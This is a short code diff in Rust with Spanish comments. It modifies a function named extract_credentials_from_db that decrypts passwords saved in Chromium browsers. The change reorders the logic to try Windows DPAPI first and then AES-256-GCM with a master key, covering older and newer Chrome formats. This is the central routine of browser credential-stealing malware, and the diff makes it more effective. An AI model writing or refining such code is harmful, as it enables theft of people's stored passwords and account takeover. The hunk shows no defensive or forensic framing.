@@ -230,15 +230,16 @@ fn extract_credentials_from_db(
             }
             
             // Intentar desencriptar el password
-            let password = if let Some(key) = master_key {
-                // Chromium moderno (v80+) usa AES-256-GCM
-                decrypt_aes_gcm(&encrypted_pwd, key).unwrap_or_else(|_| {
-                    // Fallback a DPAPI para passwords antiguos
-                    decrypt_dpapi_fallback(&encrypted_pwd).unwrap_or_else(|_| "[decrypt failed]".to_string())
-                })
+            // IMPORTANTE: Primero DPAPI (passwords viejos), luego AES-GCM (passwords nuevos)
+            let password = if let Ok(pwd) = decrypt_dpapi_fallback(&encrypted_pwd) {
+                // DPAPI v1 (Chrome antiguo, pre-v80)
+                pwd
+            } else if let Some(key) = master_key {
+                // AES-256-GCM (Chromium moderno v80+: v10/v11/v20)
+                decrypt_aes_gcm(&encrypted_pwd, key).unwrap_or_else(|_| "[decrypt failed]".to_string())
             } else {
-                // Sin master key, intentar DPAPI directo
-                decrypt_dpapi_fallback(&encrypted_pwd).unwrap_or_else(|_| "[no master key]".to_string())
+                // Sin master key y DPAPI falló
+                "[no key]".to_string()
             };
             
             credentials.push(Credential {
